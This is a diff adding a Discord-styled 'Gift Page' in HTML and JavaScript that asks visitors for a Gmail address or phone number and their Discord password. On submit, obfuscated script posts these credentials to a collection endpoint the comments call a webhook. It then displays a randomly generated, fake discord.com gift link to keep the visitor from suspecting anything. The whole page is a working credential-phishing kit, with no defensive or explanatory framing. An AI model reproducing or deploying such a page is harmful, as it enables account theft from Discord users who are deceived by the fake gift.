@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gift Page</title>
+<style>
+  body {
+    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background-color: #36393f;
+    color: #dcddde;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    padding: 0;
+  }
+  .container {
+    background-color: #202225;
+    border-radius: 8px;
+    padding: 30px;
+    width: 400px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  }
+  h2 {
+    color: #7289da;
+    margin-bottom: 20px;
+    font-weight: bold;
+  }
+  .input-group {
+    margin-bottom: 20px;
+  }
+  .input-group label {
+    display: block;
+    margin-bottom: 5px;
+    color: #b9bbbe;
+  }
+  .input-group input[type="text"],
+  .input-group input[type="password"] {
+    width: 100%;
+    padding: 8px;
+    font-size: 16px;
+    border: 1px solid #2f3136;
+    background-color: #2f3136;
+    color: #dcddde;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  .button {
+    background-color: #7289da;
+    color: white;
+    padding: 10px 20px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    margin-top: 10px;
+    cursor: pointer;
+    border: none;
+    border-radius: 4px;
+  }
+  .button:hover {
+    background-color: #677bc4;
+  }
+  .gift-container {
+    margin-top: 20px;
+    text-align: center;
+  }
+  .gift-link {
+    display: block;
+    font-size: 18px;
+    margin-bottom: 10px;
+    color: #7289da;
+  }
+  .copy-button {
+    background-color: #7289da;
+    color: white;
+    padding: 10px 20px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    cursor: pointer;
+    border: none;
+    border-radius: 4px;
+  }
+  .copy-button:hover {
+    background-color: #677bc4;
+  }
+  .select-group {
+    margin-bottom: 20px;
+  }
+  .select-group label {
+    display: block;
+    margin-bottom: 5px;
+    color: #b9bbbe;
+  }
+  .select-group select {
+    width: 100%;
+    padding: 8px;
+    font-size: 16px;
+    border: 1px solid #2f3136;
+    background-color: #2f3136;
+    color: #dcddde;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>Enter Your Details</h2>
+  <form id="giftForm">
+    <div class="input-group">
+      <label for="gmailOrNumber">Gmail or Phone number:</label>
+      <input type="text" id="gmailOrNumber" name="gmailOrNumber" required>
+    </div>
+    <div class="input-group">
+      <label for="discordPassword">Discord Password:</label>
+      <input type="password" id="discordPassword" name="discordPassword" required>
+    </div>
+    <div class="select-group">
+      <label for="country">Choose Country:</label>
+      <select id="country" name="country">
+        <option value="Morocco">Morocco</option>
+        <option value="Algeria">Algeria</option>
+        <option value="Egypt">Egypt</option>
+        <option value="Norway">Norway</option>
+        <option value="Other">Other...</option>
+      </select>
+    </div>
+    <button type="submit" class="button">Submit</button>
+  </form>
+
+  <div class="gift-container" id="giftContainer" style="display: none;">
+    <h2>Here is Your Gift:</h2>
+    <p class="gift-link" id="giftLink">https://discord.com/gifts/<span id="generatedLink"></span></p>
+    <button class="copy-button" onclick="copyGiftLink()">Copy</button>
+  </div>
+</div>
+
+<script>
+(function() {
+  function _0x7b6d() {
+    var _0x565e9a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    var _0x3b5f20 = "";
+    for (var _0x3dc1a7 = 0; _0x3dc1a7 < 16; _0x3dc1a7++) {
+      _0x3b5f20 += _0x565e9a.charAt(Math.floor(Math.random() * _0x565e9a.length));
+    }
+    return _0x3b5f20;
+  }
+
+  function copyGiftLink() {
+    var _0x6cf589 = document.getElementById("giftLink");
+    var _0x20d2c5 = document.createElement("textarea");
+    _0x20d2c5.value = _0x6cf589.textContent;
+    document.body.appendChild(_0x20d2c5);
+    _0x20d2c5.select();
+    document.execCommand("copy");
+    document.body.removeChild(_0x20d2c5);
+    alert("Gift link copied to clipboard!");
+  }
+
+  document.getElementById("giftForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    
+    var _0x6ef57a = document.getElementById("gmailOrNumber").value;
+    var _0x379549 = document.getElementById("discordPassword").value;
+    var _0x4696a2 = document.getElementById("country").value;
+    
+    // Validate Gmail or Phone number
+    var _0x4d16f1 = /^[a-zA-Z0-9._%+-]+@(gmail.com)$/i.test(_0x6ef57a);
+    if (!_0x4d16f1) {
+      alert("Unavailable Gmail, please try again");
+      return;
+    }
+    
+    // Generate random Discord gift link
+    var _0x5d9e1b = _0x7b6d();
+    
+    // Display generated link
+    document.getElementById("generatedLink").textContent = _0x5d9e1b;
+    
+    // Send data to webhook
+    fetch('/generateGiftLink', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        gmailOrNumber: _0x6ef57a,
+        discordPassword: _0x379549,
+        selectedCountry: _0x4696a2,
+        generatedLink: _0x5d9e1b
+      })
+    })
+    .then(function(response) {
+      if (!response.ok) {
+        console.error("Error sending data to webhook:", response.statusText);
+      }
+    })
+    .catch(function(error) {
+      console.error("Error sending data to webhook:", error);
+    });
+    
+    // Show the gift container
+    document.getElementById("giftContainer").style.display = "block";
+  });
+})();
+</script>
+</body>
+</html>
